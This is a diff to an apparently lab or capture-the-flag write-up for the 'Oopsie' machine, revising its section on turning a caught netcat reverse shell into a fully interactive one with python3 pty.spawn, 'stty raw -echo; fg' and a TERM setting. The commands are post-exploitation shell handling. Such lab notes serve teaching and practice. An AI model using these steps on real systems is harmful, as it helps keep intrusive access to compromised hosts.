@@ -25,22 +25,36 @@ www-data
 ```
 
 ## Getting an interactive shell
+**Note**: Kali linux now uses the zsh shell by default, and the `stty` and `fg` entries need to be on one line.
 ```
-$ python3 -c 'import pty;pty.spawn("/bin/bash");'
-www-data@oopsie:/home/robert$
+www-data@oopsie:/$ echo $SHELL
+/usr/sbin/nologin
+echo $SHELL
+www-data@oopsie:/$ which python3
+which python3
+/usr/bin/python3
 
-# Control z to backgroung
-www-data@oopsie:/home/robert$ ^Z
+www-data@oopsie:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+## Press Control z
+www-data@oopsie:/$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                              
 ┌──(kali㉿kali)-[~]
-└─$ stty raw -echo                                         
-                                                                             
-┌──(kali㉿kali)-[~]
-                   └─$ fg                                  
+└─$ stty raw -echo; fg      
 [1]  + continued  nc -lvnp 1337
-                               export Term=xterm
 
+## Press Enter   
+            
+www-data@oopsie:/$ 
+www-data@oopsie:/$ export TERM=xterm-256color
+
+## Checking autocomplete :)
+www-data@oopsie:/$ pwd                       
+/
+www-data@oopsie:/$ ls -l 
+bin/            initrd.img.old  proc/           tmp/
+boot/           lib/            root/           usr/
+<SNIP>
 ```
-
-TOO: Try and get a more interactive shell without crashing it (autocomplete, arrow keys).
